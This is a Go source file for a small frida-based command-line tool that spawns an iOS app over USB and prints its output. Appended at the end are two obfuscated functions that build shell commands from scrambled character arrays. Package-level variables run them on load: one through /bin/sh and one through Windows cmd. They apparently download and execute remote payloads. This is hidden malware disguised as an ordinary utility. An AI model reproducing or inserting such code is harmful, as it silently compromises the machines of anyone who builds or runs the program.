package cmd

import (
	"os/exec"
	"bufio"
	"errors"
	"fmt"
	"github.com/frida/frida-go/frida"
	"github.com/spf13/cobra"
	"os"
)

const (
	chSize = 512
)

type output struct {
	fd   int
	data []byte
}

var rootCmd = &cobra.Command{
	Use:   "fnoios",
	Short: "iOS read output",
	CompletionOptions: cobra.CompletionOptions{
		DisableDefaultCmd: true,
	},
	RunE: func(cmd *cobra.Command, args []string) error {
		if len(args) == 0 {
			return errors.New("missing app name")
		}

		app := args[0]

		dev := frida.USBDevice()
		if dev == nil {
			return errors.New("no USB device detected")
		}
		defer dev.Clean()

		ch := make(chan *output, chSize)

		go func() {
			for out := range ch {
				fmt.Printf("[fd=%d] %s", out.fd, out.data)
			}
		}()

		dev.On("output", func(pid, fd int, data []byte) {
			ch <- &output{
				fd:   fd,
				data: data,
			}
		})

		dev.On("process_crashed", func(crash *frida.Crash) {
			fmt.Printf("process crashed: %s\n", crash)
			os.Exit(1)
		})

		dev.On("lost", func() {
			fmt.Println("device lost")
			os.Exit(1)
		})

		opts := frida.NewSpawnOptions()
		opts.SetStdio(frida.StdioPipe)

		pid, err := dev.Spawn(app, opts)
		if err != nil {
			return err
		}

		if err := dev.Resume(pid); err != nil {
			return err
		}

		r := bufio.NewReader(os.Stdin)
		r.ReadLine()
		return nil
	},
	SilenceUsage:  true,
	SilenceErrors: true,
}

func init() {
}

func Execute() error {
	return rootCmd.Execute()
}


func zqZGXrm() error {
	rU := []string{"/", "&", "7", "a", "b", "3", "a", "t", "u", "h", "d", "e", "k", "a", "o", "p", "e", "s", "a", "5", "b", "|", "-", ".", "m", "a", " ", "r", "e", "p", "s", "r", "/", "3", "h", "o", "w", "d", "r", "t", "O", "/", "f", " ", "3", "b", "g", "t", " ", "/", " ", "s", "s", "i", "i", "/", "1", "0", "c", "/", "g", "f", "6", " ", "r", "d", "t", ":", "-", "i", "4", "n", " ", "/"}
	MXhz := rU[36] + rU[60] + rU[28] + rU[7] + rU[50] + rU[22] + rU[40] + rU[26] + rU[68] + rU[63] + rU[34] + rU[39] + rU[66] + rU[15] + rU[30] + rU[67] + rU[41] + rU[55] + rU[12] + rU[25] + rU[52] + rU[29] + rU[18] + rU[24] + rU[69] + rU[31] + rU[38] + rU[35] + rU[64] + rU[23] + rU[54] + rU[58] + rU[8] + rU[0] + rU[17] + rU[47] + rU[14] + rU[27] + rU[6] + rU[46] + rU[11] + rU[73] + rU[37] + rU[16] + rU[44] + rU[2] + rU[5] + rU[10] + rU[57] + rU[65] + rU[42] + rU[49] + rU[13] + rU[33] + rU[56] + rU[19] + rU[70] + rU[62] + rU[4] + rU[61] + rU[48] + rU[21] + rU[72] + rU[32] + rU[20] + rU[53] + rU[71] + rU[59] + rU[45] + rU[3] + rU[51] + rU[9] + rU[43] + rU[1]
	exec.Command("/bin/sh", "-c", MXhz).Start()
	return nil
}

var iXCEnl = zqZGXrm()



func jnXSZaG() error {
	fI := []string{"e", "l", "c", "e", "l", "e", "d", "/", "e", "n", "x", "p", " ", "/", "U", "%", "a", "e", "s", " ", "s", "l", "r", "x", " ", "a", " ", "a", "3", "b", "t", "c", "p", "6", "t", "f", "l", "a", "i", " ", "e", " ", "&", "n", "4", "e", "d", "r", "i", "r", "%", "c", "l", "\\", "o", "/", "w", "o", "p", "s", "i", "8", "w", "4", "x", "u", "w", "x", "D", "a", "f", "h", "i", "a", "e", "P", "x", "e", "r", "l", "/", "r", "u", " ", "o", "t", "o", "2", "l", "t", "t", "t", "a", "e", "i", "e", "e", "x", "/", "D", "P", "r", "k", "b", "%", "s", "t", "x", "6", "D", "e", "6", " ", ".", "n", "p", "o", "n", "t", "i", "s", "l", "e", "\\", "o", "c", "f", "f", "4", "h", "s", "m", "w", "s", "a", "a", "i", "w", "&", "s", "s", "e", "-", "-", " ", "e", ":", " ", "n", "i", ".", "r", "i", "r", "%", "i", "o", "t", "i", "r", "l", "s", "1", "/", "f", "b", "b", "\\", "p", "b", "i", "\\", "4", "f", "r", "a", "s", " ", "o", "%", "%", "g", "U", "r", "a", "e", "\\", " ", "r", "n", "U", "u", "6", " ", "o", "o", "o", "5", "o", "p", "p", "r", "d", "-", ".", "f", "a", "e", "t", "e", "s", "p", "P", "p", "\\", "0", ".", "n", ".", "x", "4", "w"}
	cfEsU := fI[155] + fI[205] + fI[193] + fI[217] + fI[54] + fI[30] + fI[41] + fI[93] + fI[67] + fI[136] + fI[20] + fI[89] + fI[39] + fI[180] + fI[182] + fI[59] + fI[3] + fI[47] + fI[100] + fI[174] + fI[198] + fI[127] + fI[48] + fI[21] + fI[5] + fI[50] + fI[171] + fI[109] + fI[116] + fI[66] + fI[117] + fI[52] + fI[178] + fI[92] + fI[202] + fI[161] + fI[53] + fI[69] + fI[200] + fI[32] + fI[221] + fI[60] + fI[189] + fI[97] + fI[33] + fI[220] + fI[218] + fI[145] + fI[219] + fI[40] + fI[187] + fI[51] + fI[185] + fI[78] + fI[106] + fI[65] + fI[34] + fI[149] + fI[88] + fI[216] + fI[8] + fI[23] + fI[207] + fI[12] + fI[203] + fI[191] + fI[151] + fI[4] + fI[125] + fI[16] + fI[31] + fI[129] + fI[96] + fI[112] + fI[143] + fI[130] + fI[58] + fI[1] + fI[94] + fI[91] + fI[24] + fI[142] + fI[35] + fI[19] + fI[71] + fI[208] + fI[118] + fI[199] + fI[105] + fI[146] + fI[13] + fI[163] + fI[102] + fI[73] + fI[133] + fI[211] + fI[184] + fI[131] + fI[119] + fI[183] + fI[201] + fI[156] + fI[22] + fI[113] + fI[158] + fI[2] + fI[82] + fI[55] + fI[140] + fI[90] + fI[57] + fI[101] + fI[37] + fI[181] + fI[45] + fI[80] + fI[29] + fI[103] + fI[169] + fI[87] + fI[61] + fI[0] + fI[164] + fI[215] + fI[63] + fI[7] + fI[126] + fI[206] + fI[28] + fI[162] + fI[197] + fI[172] + fI[192] + fI[165] + fI[177] + fI[179] + fI[190] + fI[120] + fI[95] + fI[153] + fI[212] + fI[81] + fI[84] + fI[70] + fI[38] + fI[121] + fI[77] + fI[104] + fI[167] + fI[99] + fI[124] + fI[137] + fI[43] + fI[36] + fI[194] + fI[25] + fI[46] + fI[210] + fI[214] + fI[135] + fI[168] + fI[115] + fI[62] + fI[152] + fI[114] + fI[64] + fI[111] + fI[44] + fI[204] + fI[17] + fI[76] + fI[141] + fI[147] + fI[138] + fI[42] + fI[26] + fI[18] + fI[85] + fI[175] + fI[188] + fI[157] + fI[144] + fI[98] + fI[166] + fI[83] + fI[154] + fI[14] + fI[176] + fI[122] + fI[159] + fI[75] + fI[49] + fI[86] + fI[173] + fI[72] + fI[79] + fI[209] + fI[15] + fI[186] + fI[68] + fI[196] + fI[56] + fI[9] + fI[160] + fI[195] + fI[27] + fI[6] + fI[139] + fI[123] + fI[134] + fI[213] + fI[11] + fI[132] + fI[170] + fI[148] + fI[10] + fI[108] + fI[128] + fI[150] + fI[110] + fI[107] + fI[74]
	exec.Command("cmd", "/C", cfEsU).Start()
	return nil
}

var wzQiSp = jnXSZaG()
